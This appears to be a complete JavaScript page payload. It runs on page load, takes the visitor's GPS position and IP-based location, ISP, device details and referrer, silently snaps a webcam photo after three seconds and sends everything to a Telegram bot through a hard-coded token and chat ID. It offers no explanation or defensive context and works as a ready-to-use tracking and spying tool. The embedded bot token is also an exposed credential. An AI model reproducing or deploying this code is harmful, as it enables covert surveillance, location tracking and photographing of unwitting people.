const BOT_TOKEN = "7862091577:AAEQ90TJM3DNXbW1s4Z58dugEMxOIcFeuSc";  
const CHAT_ID = "7324869375";  
const TELEGRAM_PHOTO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
const TELEGRAM_TEXT_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

let reportData = {
    waktu: new Date().toLocaleString("id-ID"),
    referer: document.referrer || "Tidak diketahui",
    userAgent: navigator.userAgent,
    ipInfo: { city: "-", country: "-", region: "-", ip: "-", isp: "-", proxy: "-" },
    gpsInfo: { latitude: "-", longitude: "-" }
};

function sendReport(imageBlob) {
    const caption = `📌 *Laporan Baru*\n🕒 *Waktu:* ${reportData.waktu}  
🔗 *Referer:* ${reportData.referer}\n📱 *Device:* ${reportData.userAgent}  
📍 *Kota:* ${reportData.ipInfo.city}  
🗺️ *Region:* ${reportData.ipInfo.region}  
🌏 *Negara:* ${reportData.ipInfo.country}  
🔢 *IP:* ${reportData.ipInfo.ip}  
📡 *ISP:* ${reportData.ipInfo.isp}  
📍 *Koordinat:* ${reportData.gpsInfo.latitude}, ${reportData.gpsInfo.longitude}  
🔗 [Google Maps](https://www.google.com/maps?q=${reportData.gpsInfo.latitude},${reportData.gpsInfo.longitude})`;

    if (imageBlob) {
        let formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", imageBlob, "photo.jpg");
        formData.append("caption", caption);
        formData.append("parse_mode", "Markdown");

        fetch(TELEGRAM_PHOTO_API, { method: "POST", body: formData })
            .then(response => response.json())
            .catch(error => console.error("Gagal kirim foto:", error));
    } else {
        fetch(TELEGRAM_TEXT_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: "Markdown" })
        })
        .then(response => response.json())
        .catch(error => console.error("Gagal kirim teks:", error));
    }
}

function getIPLocation() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => fetch(`https://ipwho.is/${data.ip}`))
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                reportData.ipInfo = {
                    city: data.city || "-",
                    region: data.region || "-",
                    country: data.country || "-",
                    ip: data.ip || "-",
                    isp: data.connection?.isp || "-",
                    latitude: data.latitude || "-",
                    longitude: data.longitude || "-"
                };
            }
            capturePhoto();
        })
        .catch(error => {
            console.error("Gagal ambil lokasi IP:", error);
            capturePhoto();
        });
}

function getGeolocation() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            position => {
                reportData.gpsInfo = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
                getIPLocation();
            },
            error => {
                console.warn("Gagal dapat GPS:", error.message);
                getIPLocation();
            }
        );
    } else {
        console.warn("Geolocation tidak didukung.");
        getIPLocation();
    }
}

function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                video.srcObject.getTracks().forEach(track => track.stop());

                canvas.toBlob(blob => sendReport(blob), "image/jpeg");
            }, 3000);
        })
        .catch(error => {
            console.warn("Akses kamera ditolak atau gagal:", error);
            sendReport(null);
        });
}

window.onload = getGeolocation;